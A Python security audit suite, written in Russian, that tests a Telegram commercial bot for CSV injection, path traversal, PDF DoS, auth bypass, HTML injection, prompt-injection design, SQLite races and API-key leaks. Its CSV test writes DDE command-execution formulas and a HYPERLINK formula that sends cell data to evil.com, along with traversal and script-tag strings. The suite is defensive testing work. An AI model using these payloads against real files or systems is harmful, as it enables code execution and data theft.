#!/usr/bin/env python3
"""
==============================================================================
🔥 STRESS TEST & SECURITY AUDIT SUITE: Telegram_Commercial_Bot
==============================================================================
Автор: V1PER (viper86rus-arch)
GitHub: https://github.com/viper86rus-arch/Telegram_Commercial_Bot
Лицензия: MIT License (2026)
Назначение: Автоматизированный ревизионный аудит и безжалостный стресс-тест
            кодовой базы коммерческого бота:
            1. CSV Formula Injection (CWE-1236)
            2. Path Traversal & Arbitrary File Overwrite (CWE-22)
            3. DoS & Resource Exhaustion при генерации PDF
            4. Admin Auth Bypass & IDOR / BOLA в платежах
            5. HTML Injection & Telegram Parse Mode DoS
            6. Prompt Injection архитектурный аудит
            7. SQLite Concurrency, WAL Mode & Race Conditions
            8. Token & Secret Exposure в логах/исключениях
==============================================================================
"""

import concurrent.futures
import csv
import html
import io
import json
import os
import re
import shutil
import sqlite3
import sys
import tempfile
import time

# Подключение корня проекта
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, BASE_DIR)

import config
import database
import pdf_generator
import ai_assistant


class SecurityAuditReport:
    """Хранилище результатов аудита и стресс-тестирования."""

    def __init__(self):
        self.findings = []
        self.passed_checks = []

    def add_vulnerability(self, severity, title, cwe, description, evidence, recommendation):
        self.findings.append({
            "severity": severity,  # CRITICAL, HIGH, MEDIUM, LOW
            "title": title,
            "cwe": cwe,
            "description": description,
            "evidence": evidence,
            "recommendation": recommendation
        })

    def add_pass(self, title, details):
        self.passed_checks.append({
            "title": title,
            "details": details
        })


report = SecurityAuditReport()


# ==============================================================================
# 1. ТЕСТ: CSV / FORMULA INJECTION (CWE-1236)
# ==============================================================================
def audit_csv_formula_injection():
    print("\n" + "=" * 70)
    print("🧪 [1/8] ТЕСТ: CSV Formula Injection / DDE Code Execution (CWE-1236)")
    print("=" * 70)

    temp_dir = tempfile.mkdtemp(prefix="sec_audit_csv_")
    test_db = os.path.join(temp_dir, "test_csv.db")
    test_csv = os.path.join(temp_dir, "test_leads.csv")

    orig_db = database.DB_PATH
    database.DB_PATH = test_db
    database.init_db()

    payloads = [
        {"name": "=cmd|' /C calc'!A0", "uname": "attacker", "msg": "=1+1", "tx": "TX1"},
        {"name": "@SUM(1+1)*cmd|' /C calc'!A0", "uname": "sum_bot", "msg": "Normal message", "tx": "TX2"},
        {"name": "-2+3+cmd|' /C calc'!A0", "uname": "minus_user", "msg": "Test", "tx": "TX3"},
        {"name": "+100-50", "uname": "plus_user", "msg": "Test", "tx": "TX4"},
        {"name": "\t=cmd|' /C notepad'!A0", "uname": "tab_hacker", "msg": "Tab trigger", "tx": "TX5"},
        {"name": "\r=cmd|' /C calc'!A0", "uname": "cr_hacker", "msg": "CR trigger", "tx": "TX6"},
        {"name": "Legit User", "uname": "normal_dev", "msg": "=HYPERLINK(\"http://evil.com/leak?data=\"&A1)", "tx": "TX7"}
    ]

    for p in payloads:
        lid = database.save_lead(999, p["uname"], p["name"], p["msg"])
        database.record_payment(lid, 1000, "paid_full", p["tx"])

    csv_path = database.export_leads_to_csv(filepath=test_csv)

    vulnerable_cells = []
    formula_triggers = ("=", "@", "+", "-", "\t", "\r")

    with open(csv_path, "r", encoding="utf-8-sig") as f:
        reader = csv.reader(f, delimiter=";")
        header = next(reader)
        for row_idx, row in enumerate(reader, start=1):
            for col_idx, cell in enumerate(row):
                if any(cell.startswith(trig) for trig in formula_triggers):
                    vulnerable_cells.append({
                        "row": row_idx,
                        "col": header[col_idx] if col_idx < len(header) else col_idx,
                        "raw_value": cell
                    })

    # Очистка
    database.DB_PATH = orig_db
    shutil.rmtree(temp_dir, ignore_errors=True)

    if vulnerable_cells:
        print(f"❌ НАЙДЕНА УЯЗВИМОСТЬ: Найдено {len(vulnerable_cells)} ячеек с неэкранированными формулами Excel!")
        for vc in vulnerable_cells[:5]:
            print(f"   [!] Строка {vc['row']}, Столбец '{vc['col']}': {vc['raw_value']!r}")

        report.add_vulnerability(
            severity="CRITICAL",
            title="CSV Formula Injection (CWE-1236) в экспорте отчетов",
            cwe="CWE-1236",
            description=(
                "Функция export_leads_to_csv записывает пользовательские имена (full_name), "
                "сообщения (message) и ники (username с префиксом '@') напрямую в CSV файл "
                "без нейтрализации спецсимволов формул (=, @, +, -, \\t, \\r). При открытии выгрузки "
                "в Microsoft Excel или LibreOffice Calc возможен запуск произвольного системного кода "
                "через DDE-протокол (cmd|'/C calc'!A0) или утечка данных через =HYPERLINK()."
            ),
            evidence=f"Обнаружено {len(vulnerable_cells)} сырых формульных ячеек. Пример: {vulnerable_cells[0]['raw_value']!r}",
            recommendation=(
                "Экранировать все строковые поля перед записью в CSV: если строка начинается с "
                "('=', '@', '+', '-', '\\t', '\\r'), добавлять перед ней безопасный апостроф: "
                "val = f\"'{val}\". Также для username: не добавлять сырой '@' без экранирования."
            )
        )
    else:
        print("✅ CSV Formula Injection нейтрализована: все ячейки экранированы.")
        report.add_pass("CSV Sanitization", "Спецсимволы формул экранированы апострофом.")


# ==============================================================================
# 2. ТЕСТ: PATH TRAVERSAL И ARBITRARY FILE OVERWRITE (CWE-22) В PDF GENERATOR
# ==============================================================================
def audit_pdf_path_traversal():
    print("\n" + "=" * 70)
    print("🧪 [2/8] ТЕСТ: Path Traversal & Arbitrary File Overwrite в PDF-генераторе")
    print("=" * 70)

    temp_dir = tempfile.mkdtemp(prefix="sec_audit_pdf_")
    fake_proposals = os.path.join(temp_dir, "proposals")
    os.makedirs(fake_proposals, exist_ok=True)

    orig_proposals = pdf_generator.PROPOSALS_DIR
    pdf_generator.PROPOSALS_DIR = fake_proposals

    # 1. Попытка записи файла за пределы fake_proposals при наличии подкаталога с префиксом
    os.makedirs(os.path.join(fake_proposals, "proposal_test"), exist_ok=True)
    traversal_order_id = "test/../../escaped_target"
    expected_escape_target = os.path.normpath(os.path.join(fake_proposals, f"proposal_{traversal_order_id}.pdf"))

    traversal_succeeded = False
    try:
        res_path = pdf_generator.generate_proposal_pdf(
            order_id=traversal_order_id,
            client_name="Test Traversal",
            project_type="Audit",
            db_title="None",
            extra_title="None",
            total_price=1000,
            total_days=1
        )
        resolved = os.path.normpath(res_path)
        common = os.path.commonpath([fake_proposals, resolved])

        if common != fake_proposals and os.path.exists(resolved):
            traversal_succeeded = True
            print(f"❌ НАЙДЕНА УЯЗВИМОСТЬ: Файл успешно создан вне папки proposals: {resolved}")
        else:
            print(f"ℹ️ Файл остался внутри: {resolved}")
    except Exception as e:
        print(f"ℹ️ Генерация завершилась исключением: {e}")

    # Очистка
    pdf_generator.PROPOSALS_DIR = orig_proposals
    shutil.rmtree(temp_dir, ignore_errors=True)

    if traversal_succeeded:
        report.add_vulnerability(
            severity="HIGH",
            title="Path Traversal & Arbitrary File Overwrite в pdf_generator.py (CWE-22)",
            cwe="CWE-22",
            description=(
                "Имя генерируемого файла формируется через f'proposal_{order_id}.pdf' и склеивается "
                "с PROPOSALS_DIR без валидации и санитизации order_id. Передача строк со слешами "
                "и '..' (например, 'x/../../target') позволяет выйти за пределы директории proposals/ "
                "и перезаписать произвольные файлы на диске."
            ),
            evidence=f"order_id='{traversal_order_id}' записал PDF в {expected_escape_target}",
            recommendation=(
                "Принудительно приводить order_id к целому числу (int(order_id)) либо "
                "санитизировать регулярным выражением: re.sub(r'[^a-zA-Z0-9_-]', '', str(order_id)). "
                "Дополнительно проверять: os.path.commonpath([PROPOSALS_DIR, os.path.abspath(output_path)]) == PROPOSALS_DIR."
            )
        )
    else:
        print("✅ Path Traversal предотвращен.")
        report.add_pass("PDF Path Traversal", "order_id не смог покинуть директорию proposals.")


# ==============================================================================
# 3. ТЕСТ: DOS & РЕСУРСНОЕ ИСТОЩЕНИЕ ПРИ ГЕНЕРАЦИИ PDF
# ==============================================================================
def audit_pdf_dos_and_memory():
    print("\n" + "=" * 70)
    print("🧪 [3/8] ТЕСТ: DoS & Resource Exhaustion (100k символов) в PDF-генераторе")
    print("=" * 70)

    temp_dir = tempfile.mkdtemp(prefix="sec_audit_dos_")
    pdf_generator.PROPOSALS_DIR = temp_dir

    huge_string = "А" * 100_000

    start_time = time.time()
    try:
        pdf_path = pdf_generator.generate_proposal_pdf(
            order_id="DOS_TEST",
            client_name=huge_string,
            project_type=huge_string,
            db_title="SQLite",
            extra_title="None",
            total_price=50000,
            total_days=3
        )
        elapsed = time.time() - start_time
        file_size = os.path.getsize(pdf_path) if os.path.exists(pdf_path) else 0
        print(f"⏱ Время генерации с 200k символов: {elapsed:.3f} сек, размер файла: {file_size / (1024*1024):.2f} MB")

        # Проверяем структуру PDF на переполнение длины строки оператора
        with open(pdf_path, "rb") as f:
            content = f.read()

        # Ищем длину оператора <HEX...> Tj
        hex_tj_matches = re.findall(rb"<([0-9A-Fa-f]{1000,})> Tj", content)
        max_line_len = max(len(m) for m in hex_tj_matches) if hex_tj_matches else 0

        # Стандарт PDF (ISO 32000-1) ограничивает длину строк и токенов (обычно 65 535 байт)
        if max_line_len > 65535:
            print(f"⚠️ НАЙДЕН ДЕФЕКТ: Длина PDF-токена текста ({max_line_len} байт) превышает стандартную спецификацию PDF (64KB limit).")
            report.add_vulnerability(
                severity="MEDIUM",
                title="Неограниченная длина текстовых полей в PDF (PDF Spec Overflow / DoS)",
                cwe="CWE-400 / CWE-770",
                description=(
                    f"Передача сверхдлинных строк приводит к генерации гигантского монолитного PDF-токена "
                    f"длиной {max_line_len} байт на одной строке без разбиения и обрезки. "
                    "Такой документ может приводить к аварийному завершению мобильных и десктопных PDF-вьюверов."
                ),
                evidence=f"Максимальная длина текстового токена в потоке PDF: {max_line_len} байт",
                recommendation=(
                    "Ограничить максимальную длину входных строк в PDF (например, text[:150]) "
                    "и реализовать перенос строк при превышении лимита ширины холста."
                )
            )
        else:
            print("✅ Размер PDF-токенов в пределах нормы.")
            report.add_pass("PDF Line Length", "Длина строк не превысила лимиты.")

    except Exception as e:
        print(f"❌ Сбой при обработке 100k символов: {e}")
        report.add_vulnerability(
            severity="MEDIUM",
            title="DoS / Сбой при обработке сверхдлинных строк в PDF-генераторе",
            cwe="CWE-400",
            description=f"Генератор PDF вызвал исключение при 100k символов: {e}",
            evidence=str(e),
            recommendation="Добавить ограничение длины полей и перехват исключений."
        )
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)


# ==============================================================================
# 4. ТЕСТ: ADMIN AUTH BYPASS, CHAT_ID SPOOFING & IDOR / BOLA
# ==============================================================================
def audit_admin_auth_and_idor():
    print("\n" + "=" * 70)
    print("🧪 [4/8] ТЕСТ: Контроль доступа в demo_bot.py (Admin Bypass & IDOR)")
    print("=" * 70)

    # 1. Проверка Chat ID vs User ID
    print("🔍 Анализ аутентификации администратора в demo_bot.py...")
    bot_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "demo_bot.py")
    with open(bot_path, "r", encoding="utf-8") as f:
        bot_src = f.read()

    flawed_auth = "is_admin = (str(chat_id) == str(current_admin))" in bot_src
    if flawed_auth:
        report.add_vulnerability(
            severity="HIGH",
            title="Проверка прав администратора по chat_id вместо from_user.id (Auth Spoofing)",
            cwe="CWE-285",
            description=(
                "В demo_bot.py права администратора проверяются выражением: "
                "is_admin = (str(chat_id) == str(current_admin)). "
                "Аутентификация должна строго проверять ID конкретного пользователя: msg['from']['id']."
            ),
            evidence="demo_bot.py: обнаружен is_admin = (str(chat_id) == str(current_admin))",
            recommendation="Использовать явную проверку: int(from_user_id) == int(current_admin)."
        )
    else:
        print("✅ Аутентификация администратора строго привязана к from_user.id.")
        report.add_pass("Admin Authentication", "Проверка администратора выполнена безопасно по from_user.id.")

    # 2. Проверка IDOR / BOLA в pay_confirm:
    print("🔍 Анализ IDOR / манипуляции параметрами в обработке демо-оплаты...")
    has_idor_check = "lead_owner_id != str(sender_id)" in bot_src or "lead_owner_id" in bot_src
    if not has_idor_check:
        report.add_vulnerability(
            severity="HIGH",
            title="IDOR / Parameter Tampering в подтверждении оплаты (CWE-639 / CWE-862)",
            cwe="CWE-639",
            description=(
                "Обработчик 'pay_confirm:{lead_id}:{opt}:{amount}' принимает lead_id и сумму "
                "напрямую из callback_data от клиента без проверки принадлежности заявки (user_id != lead.user_id)."
            ),
            evidence="demo_bot.py: отсутствует проверка владельца заявки в pay_confirm",
            recommendation="Перед вызовом record_payment проверять в БД принадлежность заявки пользователю."
        )
    else:
        print("✅ Защита от IDOR активна: проверяется владелец заявки в базе данных.")
        report.add_pass("IDOR Protection", "Подтверждение оплаты проверяет принадлежность заявки пользователю.")


# ==============================================================================
# 5. ТЕСТ: HTML INJECTION & TELEGRAM ENTITY PARSING DOS
# ==============================================================================
def audit_html_injection_telegram_dos():
    print("\n" + "=" * 70)
    print("🧪 [5/8] ТЕСТ: HTML Injection & Telegram Parse Mode DoS")
    print("=" * 70)

    # Тестируем get_expert_ai_response с вредоносным HTML
    malicious_user = "Hacker<script>alert(1)</script>"
    malicious_text = "Интересует парсинг <незакрытый тег & амперсанд>"

    ai_reply = ai_assistant.get_expert_ai_response(malicious_text, malicious_user)

    # Проверяем, содержит ли ответ незаэкранированные < > & в теле сообщения
    # Telegram API при parse_mode="HTML" требует строгой валидности HTML.
    # Если в тексте присутствуют <script> или <незакрытый, Telegram вернет 400 Bad Request.

    raw_angle_brackets = re.findall(r"<(?!(?:b|/b|i|/i|code|/code|s|/s|u|/u|a|/a|tg-spoiler|/tg-spoiler)\b)[^>]*>", ai_reply)
    raw_ampersands = re.findall(r"&(?!amp;|lt;|gt;|quot;)", ai_reply)

    if raw_angle_brackets or raw_ampersands:
        print(f"❌ НАЙДЕНА УЯЗВИМОСТЬ: Ответ ИИ-модуля содержит невалидный для Telegram HTML:")
        print(f"   [!] Запрещенные теги: {raw_angle_brackets}")
        print(f"   [!] Неэкранированные амперсанды: {len(raw_ampersands)} шт.")

        report.add_vulnerability(
            severity="HIGH",
            title="HTML Injection & Telegram Message Parsing DoS (CWE-79 / CWE-20)",
            cwe="CWE-79",
            description=(
                "В ai_assistant.py и demo_bot.py входные строки user_name и user_text "
                "подставляются напрямую в HTML-разметку (<b>{user_name}</b>, <i>{user_text}</i>) "
                "без использования html.escape(). При отправке пользователем текста с символами "
                "'<', '>', '&' Telegram Bot API возвращает ошибку 400 Bad Request: "
                "\"Can't parse entities: Unsupported start tag\", сообщение теряется, а бот падает в ошибку."
            ),
            evidence=f"ai_assistant.py: обнаружены незаэкранированные теги {raw_angle_brackets}",
            recommendation=(
                "Обязательно экранировать все пользовательские строки через html.escape(str(text), quote=False) "
                "перед интерполяцией в f-строки с parse_mode='HTML'."
            )
        )
    else:
        print("✅ HTML-инъекции нейтрализованы.")
        report.add_pass("HTML Sanitization", "Пользовательский ввод экранируется.")


# ==============================================================================
# 6. ТЕСТ: PROMPT INJECTION & СИСТЕМНЫЙ ПРОМПТ В GEMINI API
# ==============================================================================
def audit_prompt_injection_architecture():
    print("\n" + "=" * 70)
    print("🧪 [6/8] ТЕСТ: Prompt Injection & Архитектура промптов Gemini")
    print("=" * 70)

    ai_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ai_assistant.py")
    with open(ai_path, "r", encoding="utf-8") as f:
        ai_src = f.read()

    uses_system_instruction = '"system_instruction"' in ai_src or "'system_instruction'" in ai_src
    if not uses_system_instruction:
        report.add_vulnerability(
            severity="MEDIUM",
            title="Отсутствие разделения System Instruction и User Prompt в Gemini API (Prompt Injection)",
            cwe="CWE-707",
            description=(
                "В ai_assistant.py системный промпт и пользовательский вопрос склеиваются в единый "
                "текстовый блок: f'{SYSTEM_PROMPT}\\n\\nВопрос клиента: {prompt}'. "
                "Отсутствует использование встроенного параметра system_instruction API Gemini 1.5."
            ),
            evidence="ai_assistant.py: отсутствует system_instruction",
            recommendation="Использовать официальный параметр system_instruction в payload Gemini API."
        )
    else:
        print("✅ Защита от Prompt Injection: системный промпт изолирован в system_instruction.")
        report.add_pass("Prompt Injection Protection", "Используется нативный system_instruction Gemini API.")


# ==============================================================================
# 7. ТЕСТ: SQLITE CONCURRENCY, WAL MODE & RACE CONDITIONS
# ==============================================================================
def audit_sqlite_concurrency():
    print("\n" + "=" * 70)
    print("🧪 [7/8] ТЕСТ: SQLite Concurrency, WAL Mode & Race Conditions (30 потоков)")
    print("=" * 70)

    temp_dir = tempfile.mkdtemp(prefix="sec_audit_sqlite_")
    test_db = os.path.join(temp_dir, "test_concurrent.db")

    orig_db = database.DB_PATH
    database.DB_PATH = test_db
    database.init_db()

    # Проверка текущего journal_mode
    conn = sqlite3.connect(test_db)
    cur = conn.cursor()
    cur.execute("PRAGMA journal_mode")
    current_journal = cur.fetchone()[0].lower()
    conn.close()

    print(f"📊 Текущий режим журнала SQLite: {current_journal.upper()}")

    wal_enabled = (current_journal == "wal")

    # Стресс-тест конкурентных записей
    errors = []
    success_count = 0
    total_threads = 30

    def worker(worker_id):
        try:
            lid = database.save_lead(
                user_id=1000 + worker_id,
                username=f"worker_{worker_id}",
                full_name=f"Worker {worker_id}",
                message=f"Concurrent order from thread {worker_id}"
            )
            if lid:
                database.record_payment(lid, 5000, "paid_advance", f"TX_CONC_{worker_id}")
                return True
            return False
        except Exception as ex:
            errors.append(str(ex))
            return False

    start_time = time.time()
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(worker, i) for i in range(total_threads)]
        for f in concurrent.futures.as_completed(futures):
            if f.result():
                success_count += 1
    duration = time.time() - start_time

    print(f"⚡ Завершено {success_count}/{total_threads} транзакций за {duration:.3f} сек. Ошибок: {len(errors)}")

    if not wal_enabled:
        report.add_vulnerability(
            severity="MEDIUM",
            title="Отсутствие режима SQLite WAL (Write-Ahead Logging) для многопоточности",
            cwe="CWE-662",
            description=(
                f"SQLite база данных работает в режиме journal_mode = '{current_journal}'. "
                "В этом режиме любая операция записи монопольно блокирует весь файл базы данных, "
                "что приводит к задержкам и риску sqlite3.OperationalError: database is locked "
                "при одновременном оформлении заявок и фиксации платежей несколькими пользователями."
            ),
            evidence=f"PRAGMA journal_mode = {current_journal}",
            recommendation=(
                "При инициализации базы данных выполнить: "
                "PRAGMA journal_mode = WAL; PRAGMA synchronous = NORMAL; PRAGMA busy_timeout = 10000;"
            )
        )
    else:
        report.add_pass("SQLite WAL Mode", "Режим Write-Ahead Logging включен.")

    # Очистка
    database.DB_PATH = orig_db
    shutil.rmtree(temp_dir, ignore_errors=True)


# ==============================================================================
# 8. ТЕСТ: УТЕЧКА ТОКЕНОВ И СЕКРЕТОВ В ИСКЛЮЧЕНИЯХ И ЛОГАХ
# ==============================================================================
def audit_secret_leakage():
    print("\n" + "=" * 70)
    print("🧪 [8/8] ТЕСТ: Утечка токенов и секретов в логах / HTTPError")
    print("=" * 70)

    ai_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ai_assistant.py")
    with open(ai_path, "r", encoding="utf-8") as f:
        ai_src = f.read()

    key_in_url = "?key=" in ai_src
    header_used = "x-goog-api-key" in ai_src

    if key_in_url:
        report.add_vulnerability(
            severity="MEDIUM",
            title="Передача API-ключа в URL Query String (CWE-598 / CWE-209)",
            cwe="CWE-598",
            description=(
                "В ai_assistant.py ключ GEMINI_API_KEY передается в строке запроса GET/POST URL: '?key=...'. "
                "При возникновении сетевых ошибок (urllib.error.HTTPError) полный URL вместе с секретным API-ключом "
                "сохраняется в объекте исключения (e.url) и может утечь в системные логи, Sentry или трассировки стека."
            ),
            evidence="ai_assistant.py: обнаружен ?key= в URL",
            recommendation="Передавать API-ключ в защищенном HTTP-заголовке 'x-goog-api-key'."
        )
    else:
        print("✅ Защита API-ключа: передача выполняется через защищенный HTTP-заголовок x-goog-api-key.")
        report.add_pass("Secret Key Protection", "Ключи не передаются в строке URL.")


# ==============================================================================
# ТОЧКА ВХОДА И ВЫВОД ИТОГОВОГО СВОДНОГО РЕЙТИНГА БЕЗОПАСНОСТИ
# ==============================================================================
def main():
    print("\n" + "#" * 70)
    print("🛡️  СТАРТ КОМПЛЕКСНОГО АУДИТА БЕЗОПАСНОСТИ: Telegram_Commercial_Bot")
    print("#" * 70)

    audit_csv_formula_injection()
    audit_pdf_path_traversal()
    audit_pdf_dos_and_memory()
    audit_admin_auth_and_idor()
    audit_html_injection_telegram_dos()
    audit_prompt_injection_architecture()
    audit_sqlite_concurrency()
    audit_secret_leakage()

    print("\n" + "#" * 70)
    print("📊 ИТОГОВЫЙ ОТЧЕТ БЕЗОПАСНОСТИ И РЕЗЮМЕ ТЕХЛИДА")
    print("#" * 70)

    crit_count = sum(1 for f in report.findings if f["severity"] == "CRITICAL")
    high_count = sum(1 for f in report.findings if f["severity"] == "HIGH")
    med_count = sum(1 for f in report.findings if f["severity"] == "MEDIUM")
    low_count = sum(1 for f in report.findings if f["severity"] == "LOW")

    print(f"\nСводка уязвимостей:")
    print(f"  🔴 CRITICAL : {crit_count}")
    print(f"  🟠 HIGH     : {high_count}")
    print(f"  🟡 MEDIUM   : {med_count}")
    print(f"  🟢 LOW      : {low_count}")
    print(f"  ✅ PASSED   : {len(report.passed_checks)}")

    print("\n" + "-" * 70)
    for idx, f in enumerate(report.findings, start=1):
        color = "🔴" if f["severity"] in ["CRITICAL", "HIGH"] else "🟡"
        print(f"\n{color} [{idx}] [{f['severity']}] {f['title']} ({f['cwe']})")
        print(f"   Описание : {f['description']}")
        print(f"   Улика    : {f['evidence']}")
        print(f"   Фикс     : {f['recommendation']}")

    print("\n" + "#" * 70)
    print("🏁 АУДИТ ЗАВЕРШЕН.")
    print("#" * 70 + "\n")


if __name__ == "__main__":
    main()
